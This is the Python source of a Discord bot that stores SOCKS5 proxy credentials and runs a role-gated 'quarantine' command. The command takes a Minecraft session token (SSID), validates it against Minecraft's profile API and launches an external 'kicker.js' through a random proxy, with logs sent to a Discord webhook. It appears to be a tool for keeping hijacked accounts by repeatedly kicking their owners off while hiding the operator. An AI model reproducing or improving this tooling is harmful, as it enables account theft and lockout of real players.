import discord
from discord.ext import commands
from discord import ui
from discord.ui import Button, View
from discord import SyncWebhook
import subprocess
import random
import socks
import socket
import asyncio
import requests as req

token = "TOKEN"
subprocesses = {}
user_proxies = {}
ACCESS_ROLE_NAME = "ROLE"
image = ""

# Setup Bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="", intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    
    # Set the bot status to 'Playing a game'
    activity = discord.Game(name="Blaze Client ⚡")
    await bot.change_presence(status=discord.Status.online, activity=activity)

# Connect To SOCK5
async def connect_async(ip, port, username, password):
    loop = asyncio.get_event_loop()
    try:
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.set_proxy(socks.SOCKS5, ip, port, True, username, password)
        await loop.run_in_executor(None, s.connect, ("www.example.com", 80))
        print(f"Connection to SOCKS5 proxy {ip}:{port} successful")
        s.close()
        return True
    except Exception as e:
        print(f"Connection to SOCKS5 proxy {ip}:{port} failed - {e}")
        return False

# ProxyAdd Command
@bot.slash_command(name="add-proxies", description="Add a new proxy to your list")
async def proxyadd(ctx: discord.ApplicationCommand, proxyhost: str, proxyport: str, proxyusername: str, proxypassword: str):
    global user_proxies
    await ctx.defer(ephemeral=True)
    if ctx.author.id not in user_proxies:
        user_proxies[ctx.author.id] = []

    proxy_valid = await connect_async(proxyhost, int(proxyport), proxyusername, proxypassword)
    if not proxy_valid:
        await ctx.respond("Failed to connect to the proxy retrying 1/3", ephemeral=True)
        proxy_valid = await connect_async(proxyhost, int(proxyport), proxyusername, proxypassword)
        if not proxy_valid:
            await ctx.respond("Failed to connect to the proxy retrying 2/3", ephemeral=True)
            proxy_valid = await connect_async(proxyhost, int(proxyport), proxyusername, proxypassword)
            if not proxy_valid:
                await ctx.respond("Failed to connect to the proxy retrying 3/3", ephemeral=True)
                if not proxy_valid:
                    await ctx.respond("Failed to establish connection to the proxy", ephemeral=True)
                    return
    
    user_proxies[ctx.author.id].append({
        'host': proxyhost,
        'port': proxyport,
        'username': proxyusername,
        'password': proxypassword
    })
    await ctx.respond(f"Proxy configuration saved and connection successful! Proxy: {proxyhost}:{proxyport}", ephemeral=True)
    print(user_proxies)

# ProxyRemove Command
@bot.slash_command(name="proxyremove", description="Remove a specific proxy")
async def proxyremove(ctx: discord.ApplicationContext, proxyhost: str, proxyport: str):
    if ctx.author.id not in user_proxies or not user_proxies[ctx.author.id]:
        await ctx.respond("You don't have any proxy configurations yet!", ephemeral=True)
        return
    
    for proxy in user_proxies[ctx.author.id]:
        if proxy['host'] == proxyhost and proxy['port'] == proxyport:
            user_proxies[ctx.author.id].remove(proxy)
            await ctx.respond(f"Proxy '{proxyhost}:{proxyport}' removed successfully!", ephemeral=True)
            print(f"Updated proxies for user {ctx.author.id}: {user_proxies}")
            return 

    await ctx.respond("Proxy not found.", ephemeral=True)

# Proxies Command
@bot.slash_command(name="proxy-config", description="View your proxy config")
async def proxies(ctx: discord.ApplicationContext):
    if ctx.author.id not in user_proxies or not user_proxies[ctx.author.id]:
        await ctx.respond("You don't have any proxy configurations yet!", ephemeral=True)
        return
    
    embed = discord.Embed(title="Proxy Configurations", description="")
    for i, proxy in enumerate(user_proxies[ctx.author.id]):
        embed.add_field(name=f"Proxy {i+1}", value=f"Host: {proxy['host']}\nPort: {proxy['port']}\nUsername: {proxy['username']}\nPassword: {proxy['password']}", inline=False)
    embed.set_footer(icon_url=image)
    await ctx.respond(embed=embed, ephemeral=True)

# Confirmation Panel / Embed
class ConfirmView(ui.View):
    def __init__(self, interaction, embed):
        super().__init__(timeout=60)
        self.interaction = interaction
        self.embed = embed
        self.value = None

    @ui.button(label="Confirm", style=discord.ButtonStyle.success)
    async def confirm_button(self, button: ui.Button, interaction: discord.Interaction):
        self.value = True
        for item in self.children:
            item.disabled = True
        self.stop()

    @ui.button(label="Cancel", style=discord.ButtonStyle.danger)
    async def cancel_button(self, button: ui.Button, interaction: discord.Interaction):
        self.value = False
        for item in self.children:
            item.disabled = True
        self.stop()

# ProxyKick Command
@bot.slash_command(name="quarantine", description="Quarantine an SSID using a random proxy")
async def proxykick(interaction: discord.Interaction, ssid: str, webhook: str, time: str):
    global user_proxies
    if interaction.user.id not in user_proxies or not user_proxies[interaction.user.id]:
        await interaction.response.send_message("You don't have any proxy configurations yet!", ephemeral=True)
        return

    has_access_role = any(role.name == ACCESS_ROLE_NAME for role in interaction.user.roles)
    if not has_access_role:
        await interaction.response.send_message("You don't have the required access role.", ephemeral=True)
        return
    try:
        time_minutes = int(time)
        if time_minutes <= 0:
            raise ValueError("Time must be a positive integer.")
    except ValueError:
        await interaction.response.send_message(f"Time must be a valid integer, not {time}", ephemeral=True)
        return

    random_proxy = random.choice(user_proxies[interaction.user.id])
    proxyhost = random_proxy['host']
    proxyport = random_proxy['port']
    proxyusername = random_proxy['username']
    proxypassword = random_proxy['password']

    headers = {'Authorization': 'Bearer ' + ssid}
    response = req.get('https://api.minecraftservices.com/minecraft/profile', headers=headers)
    if response.status_code != 200:
        embed = discord.Embed(
            title=":warning: Invalid SSID :warning:",
            description="**The SSID provided is invalid**",
            color=0xFF0000
        )
        embed.set_thumbnail(url="https://r2.e-z.host/d7b13f09-4023-4c1b-8eb1-c6dd8131e80f/9lqn0dtz.gif")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    data = response.json()
    uuid = data['id']
    username = data['name']

    embed = discord.Embed(
        title="Confirm Proxy Kick",
        description=(
            f"Are you sure you want to proceed with the quarantine?\n\n"
            f"**Time:** {time_minutes} minutes\n"
            f"**Proxy Info:** {proxyhost}:{proxyport}\n"
            f"**SSID:** {ssid}\n"
            f"**Username:** {username}"
        ),
        color=0x00FF00
    )
    embed.set_thumbnail(url="https://r2.e-z.host/d7b13f09-4023-4c1b-8eb1-c6dd8131e80f/9lqn0dtz.gif")

    view = ConfirmView(interaction, embed)
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

    await view.wait()

    if view.value is None:
        await interaction.followup.send("You didn't respond in time. The action has been canceled.", ephemeral=True)
    elif view.value:
        proxy_valid = await connect_async(proxyhost, int(proxyport), proxyusername, proxypassword)

        if not proxy_valid:
            await interaction.followup.send("Failed to connect to the proxy retrying 1/3", ephemeral=True)
            proxy_valid = await connect_async(proxyhost, int(proxyport), proxyusername, proxypassword)
            if not proxy_valid:
                await interaction.followup.send("Failed to connect to the proxy retrying 2/3", ephemeral=True)
                proxy_valid = await connect_async(proxyhost, int(proxyport), proxyusername, proxypassword)
                if not proxy_valid:
                    await interaction.followup.send("Failed to connect to the proxy retrying 3/3", ephemeral=True)
                    if not proxy_valid:
                        await interaction.followup.send("Failed to establish connection to the proxy", ephemeral=True)
                        return

        if "https://discord.com/api/webhooks" in webhook:
            try:
                hitwh = SyncWebhook.from_url(webhook)
                hitwh.send(content="Started auto-kick logs :lock:")
            except Exception as e:
                embed = discord.Embed(
                    title=":warning: Invalid webhook :warning:",
                    description="**The webhook provided is invalid!**",
                    color=0xFF0000
                )
                embed.set_thumbnail(url="https://r2.e-z.host/d7b13f09-4023-4c1b-8eb1-c6dd8131e80f/9lqn0dtz.gif")
                await interaction.followup.send(embed=embed, ephemeral=True)
                return
        else:
            embed = discord.Embed(
                title=":warning: Invalid webhook :warning:",
                description="**The webhook provided is invalid**",
                color=0xFF0000
            )
            embed.set_thumbnail(url="https://r2.e-z.host/d7b13f09-4023-4c1b-8eb1-c6dd8131e80f/9lqn0dtz.gif")
            await interaction.followup.send(embed=embed, ephemeral=True)
            return

        try:
            final_embed = discord.Embed(
                title=":satellite: Auto-kick has been turned on with proxies :lock:",
                description=(
                    f"**IGN:** {username}\n"
                    f"**SSID:** {ssid}\n\n"
                    f"**Proxy Info:**\n"
                    f"Host: {proxyhost}\n"
                    f"Port: {proxyport}\n"
                    f"Username: {proxyusername}\n"
                    f"Password: {proxypassword}\n"
                    f"**Time:** {time_minutes} minutes"
                ),
                color=0x00FF00,
            )
            final_embed.set_thumbnail(url="https://r2.e-z.host/d7b13f09-4023-4c1b-8eb1-c6dd8131e80f/9lqn0dtz.gif")

            if interaction.user.id not in subprocesses:
                subprocesses[interaction.user.id] = {}

            cmd_args = ['node', 'kicker.js', ssid, uuid, username, webhook, proxyhost, proxyport, proxyusername, proxypassword, str(time_minutes)]
            subprocess_instance = subprocess.Popen(cmd_args,)
            subprocesses[interaction.user.id][username] = subprocess_instance
            await interaction.followup.send(embed=final_embed, ephemeral=True)
        except Exception as e:
            print(f"Error > {e}")
            await interaction.followup.send("An error occurred while processing the command.", ephemeral=True)
    else:
        await interaction.followup.send("The action has been canceled.", ephemeral=True)

bot.run(token)
